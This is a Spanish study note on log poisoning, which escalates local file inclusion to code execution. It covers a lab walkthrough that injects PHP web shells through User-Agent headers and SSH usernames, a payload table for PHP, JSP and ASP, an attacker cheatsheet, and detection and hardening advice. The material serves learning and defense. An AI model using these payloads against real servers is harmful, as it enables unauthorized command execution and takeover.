---
tags:
  - ciberseguridad
  - web
  - log-poisoning
tipo: concepto
estado: terminado
---

# Log Poisoning

El **Log Poisoning** (envenenamiento de logs) es la técnica de **escribir payload controlado por el atacante dentro de un archivo de registro** (que la aplicación o el SO escriben de forma rutinaria) y luego **forzar al servidor a interpretar ese log como código** — típicamente a través de una vulnerabilidad [[Local File Inclusion]]. El log es, así, el "archivo subido" que nunca pasó por un filtro de subida: el atacante no necesita [[Abuso de Subida de Archivos|upload]], solo necesita un campo que se registre (User-Agent, URL, nombre de usuario de SSH) y un LFI que lo incluya. Es la cadena LFI→RCE más clásica.

> [!info] La mecánica completa de la cadena
> 1. **Escritura**: el atacante envía un dato que el servidor guarda literalmente en un log (`User-Agent: <?php system($_GET['c']); ?>`).
> 2. **Persistencia**: el payload queda en disco en un archivo conocible o adivinable (`/var/log/apache2/access.log`).
> 3. **Interpretación**: el LFI hace `include("/var/log/apache2/access.log")`. PHP (u otro intérprete) **ejecuta** el payload incrustado en medio del texto del log.
> 4. El campo `disable_functions` de PHP puede limitar qué funciones de ejecución están disponibles, pero el análisis de `phpinfo()` permite mapearlo.

La clave conceptual: **los logs son datos de confianza para el SO pero contienen datos no confiables del atacante**. Cualquier componente que "lee sus propios logs" (visores web, incluidores, collectors) convierte el log en vector de ejecución o de XSS.

## Fuentes de log envenenables y sus rutas

| Fuente | Dato controlado | Ruta típica (Debian/Ubuntu) | Ruta RHEL/CentOS |
|---|---|---|---|
| Apache `access.log` | **User-Agent**, URL/URI, Referer, Host, cualquier header | `/var/log/apache2/access.log` | `/var/log/httpd/access_log` |
| Apache `error.log` | mensajes que incluyen URLs/inputs (p. ej. 404 con la ruta pedida) | `/var/log/apache2/error.log` | `/var/log/httpd/error_log` |
| Nginx | igual que Apache, `log_format` personalizado puede incluir más campos | `/var/log/nginx/access.log` | `/var/log/nginx/access.log` |
| SSH (sshd) | **nombre de usuario** del intento de login | `/var/log/auth.log` | `/var/log/secure` |
| Intentos fallidos SSH (binario) | usuario | `/var/log/btmp` (binario) | `/var/log/btmp` |
| Sesiones PHP | `PHPSESSID` solo es el nombre; el contenido lo controla la app | `/var/lib/php/sessions/sess_<id>` | `/var/lib/php/session/sess_<id>` |
| Mail (postfix/sendmail) | asunto, remitente, destinatario en cola | `/var/mail/<user>`, `/var/spool/mail/` | idem |
| FTP/Vsftpd, cron, app custom | entradas diversas | `/var/log/vsftpd.log`, `/var/log/syslog` | `/var/log/messages` |

> [!tip] El session file es el LFI→RCE más limpio
> Si el LFI exige una extensión o no permite `../`, el **session file** de PHP suele salvar el ataque: la app guarda el user input en `$_SESSION` (p. ej. un campo de nombre), el archivo vive en una ruta predecible (`sess_<cookie PHPSESSID>`), y su contenido incluye el payload sin filtros. Payload típico: enviar `<?php system($_GET['c']); ?>` como nombre de usuario, y luego `?page=/var/lib/php/sessions/sess_TU_COOKIE` (sin traversal si la app incluye rutas absolutas).

## Notas de la práctica

Se creó una máquina donde tenemos un [[Local File Inclusion]] muy básico pero que nos va a servir para comprender el concepto:

![[Pasted image 20250825170217.png]]

Como podemos observar, ya tenemos el [[Local File Inclusion]] y el objetivo es ver si nosotros podemos ver los logs del servicio en la ruta `/var/log/apache2/access.log` el cual almacena todas las peticiones que se reciben:

![[Pasted image 20250825170516.png]]

Sin importar el código de estado, siempre se almacenarán aquí. Algo a tener en cuenta es que los usuarios pertenecientes al grupo `adm` pueden mirar logs.

En este punto vamos a ver si logramos listar esto desde la web:
![[Pasted image 20250825170731.png]]

Como podemos observar, sí podemos ver los logs. En este punto lo que vamos a hacer es primero comprender que lo de `Mozilla/5.0....` es el `User-Agent` del dispositivo que envía las peticiones. Nosotros este campo, al momento de hacer una consulta, lo podemos cambiar de la siguiente manera:

```bash
curl -s -X GET "http://192.168.1.70/probando" -H "User-Agent: PROBANDO"
```

![[Pasted image 20250825171038.png]]

Podemos ver que el `User-Agent` cambió y ya esto es suficiente para, en este caso, inyectar código PHP con el objetivo de que se interprete:

```bash
curl -s -X GET "http://192.168.1.70/probando" -H "User-Agent: <?php system('whoami'); ?>"
```

![[Pasted image 20250825171215.png]]

Vemos que efectivamente logramos ejecutar el comando.

Ahora, si queremos saber si la función `system` está activa, podemos hacer:

```bash
curl -s -X GET "http://192.168.1.70/probando" -H "User-Agent: <?php phpinfo(); ?>"
```

![[Pasted image 20250825171414.png]]

El propósito de esto es ver qué funciones están deshabilitadas en el campo de `disable_functions`. Si no vemos nada, pues podemos usar cualquier función y podemos seguir con el ataque.

> [!info] `system()` vs `phpinfo()`
> *   La función `system()` en PHP ejecuta un comando externo y muestra la salida. Es una de las funciones más comunes para lograr RCE.
> *   La función `phpinfo()` muestra una gran cantidad de información sobre la configuración actual de PHP, incluyendo las variables de entorno, módulos cargados, y lo más importante para este ataque, la directiva `disable_functions` que lista las funciones que han sido deshabilitadas por seguridad.

Para dejar el acceso persistente y ejecutar comandos a voluntad, inyectamos un webshell parametrizado (corrección del payload: `$_GET`, no `\_GET`):

```bash
curl -s -X GET "http://192.168.1.70/probando" -H "User-Agent: <?php system($_GET['cmd']); ?>"
```

![[Pasted image 20250825171943.png]]

Ahora, otros logs de los que se puede abusar es SSH, por lo que puede estar en dos rutas: `/var/log/auth.log` o `/var/log/btmp`. Por lo que si tratamos de ver alguno de ellos, veremos las conexiones del servicio:

![[Pasted image 20250825172226.png]]

Si nos fijamos, el input que controlamos y está en el log es el usuario, por lo que será en este donde intentemos la inyección. Entonces, lo que vamos a hacer sería lo siguiente:

```bash
ssh '<?php system("whoami"); ?>'@localhost
```

Y si revisamos los logs desde la web, podremos ver cómo se ejecuta el comando:

> [!warning] Vulnerabilidad SSH Parcheada
> Es importante notar que la inyección de código PHP directamente en el nombre de usuario de SSH para Log Poisoning es una técnica que ha sido parcheada en muchas distribuciones modernas. Los servidores SSH suelen sanear o codificar las entradas de usuario antes de escribirlas en `auth.log` o `btmp`, lo que impide la interpretación de código PHP. Este ejemplo es más ilustrativo del concepto que de una vulnerabilidad activa en sistemas actualizados.

## Catálogo de payloads por fuente

| Fuente | Payload | Notas |
|---|---|---|
| User-Agent (PHP) | `<?php system($_GET['c']); ?>` | el más fiable |
| User-Agent (JSP) | `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` | para servidores Java/Tomcat |
| User-Agent (ASP) | `<% eval request("cmd") %>` | IIS clásico |
| URL / path (404 en error.log) | `GET /<?php system($_GET['c']); ?>` | el 404 registra el path completo |
| Usuario SSH | `ssh '<?php system("whoami"); ?>'@host` | parcheado en distros modernas |
| Nombre en app (session file) | nombre de usuario = payload PHP | cadena más limpia si hay session files |
| Mail log | asunto/remetente con payload | requiere LFI al spool de mail |

## Log Poisoning sin LFI: visores de log y XSS

No toda la técnica depende de LFI. Si la aplicación **muestra sus propios logs** en un panel (SIEM web, panel de auditoría, debug toolbar) y no escapa el HTML, el User-Agent envenenado produce **[[Cross-Site Scripting XSS|XSS]] almacenado** en los administradores que revisan el log. Del mismo modo, inyección de líneas (*CRLF*) en campos registrados puede falsificar entradas de log (*log forging*) para ocultar rastros o inducir a error a un analista. Mitigación común a ambos: escapar en visualización y validar/escapar al registrar.

## Detección

- **Lector / defensor**: picos de requests con User-Agent anómalos (`<?php`, `<%`, `<script>`), intentos SSH con usuarios que contienen caracteres raros (`<?`, espacios, comillas), entradas de log que contienen patrones de código.
- **Atacante (reconocimiento)**: primero confirmar lectura del log con `?page=/var/log/apache2/access.log` y buscar el UA propio (`curl -H 'User-Agent: marqueador-unico-123'`); si aparece, la escritura está confirmada antes de inyectar.

## Defensas

**1. No incluir nunca archivos basados en input** (mitiga la raíz, [[Local File Inclusion]]) y **2. mantener los logs fuera del alcance del usuario del servidor web**:

```bash
# logs con dueño root y grupo distinto del www-data
chown root:adm /var/log/apache2/access.log
chmod 640 /var/log/apache2/*            # el proceso web NO puede leerlos
# ideal: /var/log NO montado en el contenedor/chroot de la app
```

**3. Escapar/sanear al registrar** (lado aplicación, Node.js ejemplo):

```js
const winston = require('winston');

// registrar solo campos saneados: escapa <, > y controla longitud
const sanitize = (v) => String(v).slice(0, 120).replace(/[<>]/g, '');
app.use((req, res, next) => {
  log.info('request', { ua: sanitize(req.headers['user-agent']), ip: req.ip });
  next();
});
```

**4. PHP: reducir la superficie de ejecución** en `php.ini`:

```ini
disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec
allow_url_include = Off        ; mata php://input y data:// en include()
open_basedir = /var/www/html   ; limita qué rutas puede abrir PHP
```

**5. Buenas prácticas de logging**: no confiar en el log como dato de entrada para nada (ni para mostrarlo sin escapar, ni para parsearlo con intérpretes); rotar y almacenar centralmente (SIEM) donde el origin server no tenga lectura directa.

## Errores comunes

**Atacante:**
1. Inyectar en el UA y dar por hecho que el log es interpretable: verificar primero **lectura** del log y luego **interpretación** (si el include fuerza extensión `.php` o el servidor sirve el log como texto plano, no hay ejecución).
2. Usar rutas de log equivocadas para la distro (`auth.log` vs `secure`) — enumerar con `/etc/os-release` si el LFI lo permite.
3. Ignorar `disable_functions`: confirmar con `phpinfo()` antes de asumir `system()` disponible.
4. Olvidar que el payload puede quedar truncado si el logger sanea caracteres de control o longitud.

**Defensor:**
1. Montar `/var/log` dentro del chroot/contenedor de la app "para depurar".
2. Visores de log sin escapar en HTML (XSS almacenado hacia admins).
3. Asumir que "nadie incluye archivos", sin apply `open_basedir` como defensa en profundidad.
4. Registrar user input crudo en campos que luego se reusan (emails, plantillas, reportes).

## Cheatsheet

| Paso | Acción |
|---|---|
| 1. Confirmar LFI | leer `/etc/passwd` o el log candidato |
| 2. Confirmar escritura | `curl -H 'User-Agent: MARKER'` → buscar MARKER en el log |
| 3. Inyectar | UA = `<?php system($_GET['c']); ?>` (o JSP/ASP según stack) |
| 4. Ejecutar | incluir el log y pasar `?cmd=id` |
| 5. Alternativa limpia | session file: payload en `$_SESSION` + `sess_<id>` |
| Rutas Debian | `/var/log/apache2/access.log`, `/var/log/auth.log` |
| Rutas RHEL | `/var/log/httpd/access_log`, `/var/log/secure` |
| Sessions PHP | `/var/lib/php/sessions/sess_<id>` |

## Referencias

- HackTricks — LFI2RCE via log poisoning: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lf2rce-via-log-poisoning.html
- PayloadsAllTheThings — Log Inclusion: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#log-inclusion
- OWASP — Log Injection (CWE-117): https://owasp.org/www-community/attacks/Log_Injection

## Relacionadas

- [[Local File Inclusion]] — el prerrequisito de lectura/inclusión que hace posible la cadena
- [[Path Traversal]] — cómo llegar al log si está fuera del directorio base
- [[Abuso de Subida de Archivos]] — alternativa al log cuando sí hay upload (web shell directo)
- [[OS Command Injection]] — si el input llega a un shell, no hace falta esperar al log
- [[Cross-Site Scripting XSS]] — visores de log sin escapar = XSS almacenado hacia administradores
